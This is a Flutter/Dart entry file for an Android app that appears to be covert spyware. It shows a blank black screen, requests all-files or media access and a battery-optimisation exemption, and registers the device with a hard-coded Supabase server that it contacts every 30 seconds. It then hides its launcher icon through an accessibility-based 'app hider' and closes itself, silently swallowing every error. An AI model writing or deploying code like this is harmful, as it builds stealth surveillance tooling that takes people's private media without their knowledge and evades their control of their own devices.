import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart';
import 'core/device_id.dart';

const String SUPABASE_URL =
    'https://kywpnhaermwldzcwtsnv.supabase.co';

const int HEARTBEAT_INTERVAL_SECONDS = 30;

// ---- CHANNELS ----
const MethodChannel _permChannel =
    MethodChannel('cyber_agent/permissions');

const MethodChannel _batteryChannel =
    MethodChannel('cyber_agent/battery');

const MethodChannel _appHider =
    MethodChannel('cyber_accessibility_agent/app_hider');

// ---- PREF KEYS ----
const String _prefSetupDone = 'setup_done';
const String _prefBatteryAsked = 'battery_asked';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: SilentSetupPage(),
    );
  }
}

class SilentSetupPage extends StatefulWidget {
  const SilentSetupPage({super.key});

  @override
  State<SilentSetupPage> createState() => _SilentSetupPageState();
}

class _SilentSetupPageState extends State<SilentSetupPage> {
  bool _agentStarted = false;
  bool _closing = false;

  Timer? _heartbeatTimer;
  Timer? _pollTimer;

  @override
  void initState() {
    super.initState();
    _silentInit();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    _pollTimer?.cancel();
    super.dispose();
  }

  Future<void> _silentInit() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final setupDone = prefs.getBool(_prefSetupDone) ?? false;

      if (setupDone) {
        await _startAgentIfNeeded();
        _closeAppSilently();
        return;
      }

      await _handleBatteryOptimization();

      try {
        await _permChannel.invokeMethod('requestPermissions');
      } catch (_) {}

      int attempts = 0;
      const maxAttempts = 180;

      _pollTimer =
          Timer.periodic(const Duration(milliseconds: 1500), (_) async {
        attempts++;
        final ok = await _checkStoragePermissions();
        if (ok) {
          _pollTimer?.cancel();
          await _onPermissionsGranted();
        } else if (attempts >= maxAttempts) {
          _pollTimer?.cancel();
        }
      });
    } catch (_) {}
  }

  Future<void> _handleBatteryOptimization() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final alreadyAsked = prefs.getBool(_prefBatteryAsked) ?? false;
      if (alreadyAsked) return;

      final bool ignoring = await _batteryChannel
              .invokeMethod('isIgnoringBatteryOptimizations') ==
          true;

      if (!ignoring) {
        try {
          await _batteryChannel.invokeMethod('requestIgnoreBatteryOptimizations');
        } catch (_) {}
      }

      await prefs.setBool(_prefBatteryAsked, true);
    } catch (_) {
      try {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setBool(_prefBatteryAsked, true);
      } catch (_) {}
    }
  }

  Future<bool> _checkStoragePermissions() async {
    try {
      final Map<dynamic, dynamic>? map =
          await _permChannel.invokeMethod('checkStoragePermissions');
      if (map == null) return false;

      return map['hasAllFilesAccess'] == true ||
          (map['readMediaImages'] == true &&
              map['readMediaVideo'] == true &&
              map['readMediaAudio'] == true);
    } catch (_) {
      return false;
    }
  }

  Future<void> _onPermissionsGranted() async {
    if (_closing) return;
    _closing = true;

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool(_prefSetupDone, true);
    } catch (_) {}

    await _startAgentIfNeeded();

    try {
      await _appHider.invokeMethod('hide');
    } catch (_) {}

    await Future.delayed(const Duration(seconds: 2));
    _closeAppSilently();
  }

  Future<void> _startAgentIfNeeded() async {
    if (_agentStarted) return;
    _agentStarted = true;

    try {
      final deviceId = await DeviceId.getOrCreate();

      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_URL,
        deviceId: deviceId,
      );

      final registeredId = await DeviceAgent.instance.register();

      if (registeredId != null &&
          registeredId.isNotEmpty &&
          registeredId != deviceId) {
        await DeviceId.set(registeredId);
      }

      _heartbeatTimer?.cancel();
      _heartbeatTimer = Timer.periodic(
        const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
        (_) => DeviceAgent.instance.heartbeat(),
      );
    } catch (_) {
      _agentStarted = false;
    }
  }

  void _closeAppSilently() {
    try {
      SystemNavigator.pop(animated: true);
    } catch (_) {
      if (Platform.isAndroid) {
        exit(0);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Colors.black,
      body: SizedBox.expand(),
    );
  }
}